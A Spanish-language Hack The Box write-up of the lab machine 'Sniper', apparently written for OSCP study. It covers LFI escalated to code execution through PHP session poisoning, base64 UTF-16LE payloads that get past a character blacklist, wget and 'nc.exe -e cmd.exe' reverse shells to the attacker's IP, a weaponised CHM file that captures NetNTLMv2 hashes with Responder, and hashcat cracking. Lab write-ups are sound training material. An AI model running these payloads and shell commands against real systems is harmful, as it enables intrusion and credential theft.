---
tags:
  - type/writeup
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/211
dificultad: Media
ip: 10.10.10.151
os: Windows
relacionados:
---
# HackTheBox - Sniper

Para conectarme con psexec necesito privilegios de administrador local
5985 puerto para conexion remota con winrm
Que el usuario chris tenga Remote Management Users es clave para entender que puedo conectarme con winrm

Desde una powershell:
```ps
hostname 
# Sniper

$user = "Sniper\chris"
$password = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $password)

Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { whoami }



```

## Reconocimiento

Primero, realicé un escaneo rápido de todos los puertos TCP y luego un escaneo más detallado
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Reconnaissance/allports
nmap -sCV -p22,80 $(cat ip) -oN 00_Reconnaissance/sCV
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-24 10:00 EDT
Nmap scan report for 10.10.10.151
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```

El escaneo reveló que la máquina es un sistema Windows corriendo un servidor web **Microsoft IIS 10.0** en el puerto 80. Al visitar el sitio web, encontré una página corporativa de "Sniper Co." con una sección de blog y una página de login. El blog parecía el punto de entrada más interesante.

>[!summary] Conclusiones del Reconocimiento
>
>- **Sistema Operativo:** Windows
  >  
>- **Servicios Expuestos:** Un servidor web **Microsoft IIS 10.0** en el puerto `80`.
 >   
>- **Punto de Entrada:** El sitio web "Sniper Co." es mi único punto de entrada visible. Procedo a analizarlo en busca de vulnerabilidades.
    

## Análisis de vulnerabilidades

### Local File Inclusion (LFI)

Al explorar el sitio web, navegué a la sección del blog. Noté que la funcionalidad de cambio de idioma modificaba la URL con un parámetro `lang` para cargar diferentes archivos.
`http://10.10.10.151/blog/?lang=blog-en.php`

Esta es una señal clásica de una posible vulnerabilidad de **Inclusión de Ficheros Locales (LFI)**.
1. Primer Intento (Fallido): Probé la técnica de Directory Traversal con ../ para intentar acceder a un archivo de sistema conocido.
     http://10.10.10.151/blog/?lang=../../../windows/win.ini
    Este intento no tuvo éxito, lo que me llevó a pensar en un posible filtro o en una configuración diferente de la ruta base.
    
2. Segundo Intento (Exitoso): Mi siguiente hipótesis fue probar una ruta absoluta desde la raíz del sistema de archivos.
    http://10.10.10.151/blog?lang=/windows/win.ini

Para confirmar la vulnerabilidad de manera concluyente, utilicé `curl` y verifiqué la respuesta.
```Bash
curl -X GET "http://10.10.10.151/blog/?lang=/windows/win.ini"
```

El contenido de `win.ini` apareció al final del código fuente HTML, confirmando mis sospechas.

>[!success] Vulnerabilidad Crítica Identificada
>
He confirmado una vulnerabilidad de LFI que me permite leer archivos del sistema utilizando rutas absolutas. El siguiente paso es escalar este acceso de lectura a ejecución de código.


---

## Explotación de vulnerabilidades

>[!abstract] Plan de Ataque para RCE
>
Mi objetivo es escalar el LFI a Ejecución Remota de Código (RCE). La estrategia será el envenenamiento de archivos de sesión de PHP:
>
>1. Crear una sesión de usuario válida en la aplicación.
>2. Inyectar un payload de PHP en un dato que se almacene en el archivo de sesión (como el nombre de usuario).
>3. Utilizar el LFI para incluir y, por lo tanto, ejecutar el archivo de sesión manipulado en el servidor.
    
### 1. Envenenamiento de la Sesión

Primero, me registré como un usuario normal (`guest:guest`) para generar un archivo de sesión. Luego, extraje mi `PHPSESSID` de las cookies del navegador. Sabiendo que en Windows los archivos de sesión de PHP a menudo se guardan en `C:\Windows\TEMP`, pude construir la ruta completa a mi archivo de sesión:

`C:\Windows\TEMP\sess_923nktm0mi12qrptls332t5o`

El siguiente paso fue registrar un nuevo usuario, pero esta vez utilicé un payload de PHP como nombre de usuario. Los backticks (`` ` ``) en PHP son un alias para `shell_exec()`, lo que los hace perfectos para un payload conciso.
- **Username malicioso:** `<?=`powershell whoami`?>`
    
Después de registrarme e iniciar sesión con este usuario, utilicé el LFI para incluir mi archivo de sesión y ejecutar el payload.
```Bash
curl -X GET "http://10.10.10.151/blog/?lang=/windows/temp/sess_923nktm0mi12qrptls332t5o"
```

La respuesta contenía `nt authority\iusr`, ¡éxito! Tenía RCE.

### 2. Evadiendo el Blacklist

Al intentar payloads más complejos, descubrí un blacklist de caracteres. Para identificarlo, usé un script de Python que iteraba sobre los caracteres especiales, intentaba registrar un usuario con cada uno y verificaba si el login fallaba.

El script reveló que `$&'(-.;[_` estaban prohibidos.

>[!tip] Técnica de Evasión
>
La mejor manera de eludir un blacklist de caracteres en este escenario es usar la funcionalidad de codificación de PowerShell. El parámetro -enc o -encodedcommand acepta un comando codificado en Base64, evitando por completo los caracteres problemáticos.

>[!danger] Codificación para PowerShell en Windows
>
Es fundamental recordar que PowerShell en Windows espera que la cadena Base64 esté codificada en UTF-16LE. Omitir este paso hará que el payload falle.

### 3. Obteniendo una Shell Reversa

Mi plan para obtener una shell interactiva se dividió en dos fases: subir `nc.exe` y luego ejecutarlo.

**Fase 1:** Subir Netcat
Aloje nc.exe en un servidor web local y generé el payload para descargarlo en el directorio C:\Windows\TEMP.
```Bash
echo "wget http://<MI_IP>/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
```
Registré un nuevo usuario con el payload resultante y lo activé usando el LFI.

**Fase 2:** Ejecutar la Shell Reversa
Puse un listener en mi máquina en el puerto 1234 (nc -lvp 1234). Luego, generé el segundo payload para ejecutar Netcat y conectarlo a mi listener.
```Bash
echo "C:\Windows\TEMP\nc.exe -e cmd.exe <MI_IP> 1234" | iconv -t UTF-16LE | base64
```

Me registré con este último payload, lo activé, y al instante recibí una shell como `nt authority\iusr`.


---

## Escalada de privilegios

### Movimiento Lateral: de IUSR a Chris

La enumeración post-explotación es clave. Buscando archivos de configuración en el directorio web `C:\inetpub\wwwroot\user\`, encontré un archivo crucial: `db.php`.

>[!danger] Credenciales Expuestas
>
Dentro de db.php, encontré las credenciales de la base de datos en texto plano:
>
>- **Usuario:** `sniper`
  >  
>- **Contraseña:** `36mEAhz/B8xQ~2VM`
    

Al listar los usuarios locales con `net users`, identifiqué a un usuario llamado `chris`. Mi hipótesis fue la **reutilización de contraseñas**. Para verificarlo de forma segura, utilicé `Invoke-Command` en PowerShell para ejecutar un comando simple como `chris` usando las credenciales encontradas.
```PowerShell
# 1. Preparar las credenciales
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;

# 2. Verificar ejecutando un comando simple
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
# SALIDA: sniper\chris -> Éxito!
```

Confirmada la contraseña, utilicé la misma técnica para obtener una shell interactiva como `chris`, esta vez ejecutando `nc.exe` para que se conectara a un nuevo listener (`nc -lvp 4444`).

### Escalada Final: de Chris a Administrador

Como `chris`, encontré una nota en `C:\Docs\` que implicaba que el administrador revisaba regularmente los archivos en esa carpeta. En la carpeta de descargas de Chris, había un archivo `instructions.chm`.

>[!tip] Vector de Ataque: Abuso de Archivos CHM
>
Los archivos .chm (Compiled HTML Help) pueden ser armados para que, al abrirse, intenten autenticarse contra una ruta UNC (ej. \\<IP_atacante>\recurso). Esto permite capturar el hash NetNTLMv2 del usuario que abre el archivo.

Mi plan era claro:

1. **Crear un CHM malicioso:** Creé un archivo HTML simple que contenía una imagen apuntando a mi IP.
    ```HTML
    <html><body><img src=\\10.10.14.23\share\a.png /></body></html>
    ```
    
2. **Compilarlo:** Usé "HTML Help Workshop" en una VM de Windows para compilar este HTML en `instructions.chm`.
    
3. **Preparar la Captura:** Inicié `Responder` en mi máquina para capturar los hashes que llegaran.
    ```Bash
    sudo python Responder.py -I tun0
    ```
    
4. **Ejecutar la Trampa:** Subí mi `instructions.chm` malicioso a la máquina víctima y lo moví a `C:\Docs\`.
    ```PowerShell
    copy C:\Users\chris\instructions.chm C:\Docs\
    ```
    

Momentos después, `Responder` capturó el hash NetNTLMv2 del administrador. Lo guardé en `hash.txt` y lo crackeé con `hashcat`.
```Bash
hashcat -m 5600 --force hash.txt /usr/share/wordlists/rockyou.txt
```

>[!success] Contraseña de Administrador Obtenida
>
La contraseña del administrador era: butterfly!#1

Con la contraseña final, solo quedaba obtener la shell como administrador, usando el mismo método de `Invoke-Command`. Preparé un último listener (`nc -lvp 5555`) y ejecuté el comando final para obtener una shell como `nt authority\system`.1
```PowerShell
$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe <MI_IP> 5555} -credential $credential;
```

---

## Vulnerabilidades y Conceptos Clave

- **Local File Inclusion (LFI):** La vulnerabilidad inicial que permitió la lectura de archivos del sistema.
    
- **PHP Session Poisoning:** Una técnica avanzada para escalar un LFI a RCE en servidores PHP.
    
- **Evasión de Filtros:** Uso de codificación Base64 (UTF-16LE) para eludir blacklists de caracteres.
    
- **Reutilización de Contraseñas:** Un error de seguridad común que facilitó el movimiento lateral.
    
- **Captura de Hashes NetNTLMv2:** Abuso de una funcionalidad de Windows (archivos CHM) para forzar una autenticación y robar el hash de un usuario privilegiado.
    
- **PowerShell Remoting (Invoke-Command):** Una poderosa herramienta para ejecutar comandos y verificar credenciales de forma sigilosa en sistemas Windows.


___

## Bandera(s)

> [!flag] `flag{user}`
^bandera-user

> [!flag] `flag{root}`
^bandera-root
